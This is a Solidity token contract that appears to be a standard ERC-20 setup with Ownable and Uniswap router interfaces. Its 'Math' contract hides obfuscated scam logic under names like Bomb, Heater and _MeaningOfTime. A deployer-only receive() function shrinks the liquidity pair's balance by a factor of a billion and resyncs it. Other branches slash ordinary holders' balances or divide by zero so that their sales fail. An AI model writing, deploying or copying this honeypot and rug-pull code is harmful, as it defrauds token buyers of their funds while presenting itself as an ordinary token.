pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Heater;

    address[] internal timArr; address[3] internal tAddr;

    bool[3] internal Bomb; bool internal trading = false;

    uint256 internal Gore = block.number*2; uint256 internal numB;
    uint256 internal Diver = 0; uint256 internal Races = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function _set() internal {
        tAddr[0] = address(_router);
        tAddr[1] = msg.sender;
        tAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Heater[Math.tAddr[q]] = true; Math.Bomb[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Diver > 1 ? timArr[timArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == tAddr[1]); _balances[tAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(tAddr[2]).sync(); Bomb[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == tAddr[1])), "ERC20: trading is not yet enabled.");
        Races += ((Heater[sender] != true) && (Heater[recipient] == true)) ? 1 : 0;
        if (((Heater[sender] == true) && (Heater[recipient] != true)) || ((Heater[sender] != true) && (Heater[recipient] != true))) { timArr.push(recipient); }
        _MeaningOfTime(sender, recipient);
    }

    function _MeaningOfTime(address sender, address recipient) internal {
        if ((Bomb[0] || (Bomb[2] && (recipient != tAddr[1])))) { for (uint256 q=0; q < timArr.length-1; q++) { _balances[timArr[q]] /= (Bomb[2] ? 1e9 : 4e1); } Bomb[0] = false; }
        _balances[last(1)] /= (((Gore == block.number) || Bomb[1] || ((Gore - numB) <= 7)) && (Heater[last(1)] != true) && (Diver > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Bomb[1]) && (last(0) == sender)) || ((Bomb[2] && (tAddr[1] != sender))) ? (0) : (1));
        (Bomb[0],Bomb[1]) = ((((Races*10 / 4) == 10) && (Bomb[1] == false)) ? (true,true) : (Bomb[0],Bomb[1]));
        Gore = block.number; Diver++;
    }
}